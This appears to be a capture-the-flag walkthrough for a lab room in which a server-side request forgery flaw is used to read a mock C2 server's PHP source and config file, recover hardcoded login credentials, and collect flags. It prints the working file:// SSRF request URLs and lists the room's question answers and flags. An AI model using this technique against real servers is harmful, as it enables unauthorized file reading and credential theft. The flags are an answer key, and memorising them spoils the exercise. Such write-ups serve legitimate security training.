
```bash
echo "10.10.17.199 mcgreedysecretc2.thm" >> /etc/hosts
```
Visit site
http://mcgreedysecretc2.thm/getClientData.php?url=file:////var/www/html/index.php
```
<?php
session_start();
include('config.php');
// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // Retrieve the submitted username and password
  //print_r($_SERVER);
  $uname = $_POST["username"];
  $pwd = $_POST["password"];

  // Check if both the username and password are "hello"
  if ($uname === $username && $pwd === $password) {
    // If both are "hello," load the page (replace 'page.php' with the actual page URL)
    $_SESSION['logged_in'] = true;
    header("Location: dashboard.php");
    exit();
  } else {
    // If not, display an error message
    $error_message = "Invalid password. Please try again.";
  }
}
?>
```
http://mcgreedysecretc2.thm/getClientData.php?url=file:////var/www/html/config.php
```
<?php
$username = "mcgreedy";
$password = "mcgreedy!@#$%";

?>
```

Login with mcgreedy:mcgreedy!@#$%


# Is SSRF the process in which the attacker tricks the server into loading only external resources (yea/nay)?
nay

# What is the C2 version?
Version 1.1
1.1

# What is the username for accessing the C2 panel?
mcgreedy

# What is the flag value after accessing the C2 panel?
Flag: THM{EXPLOITED_31001}
THM{EXPLOITED_31001}

# What is the flag value after stopping the data exfiltration from the McSkidy computer?
The agent has been removed. Flag: THM{AGENT_REMOVED_1001}
THM{AGENT_REMOVED_1001}
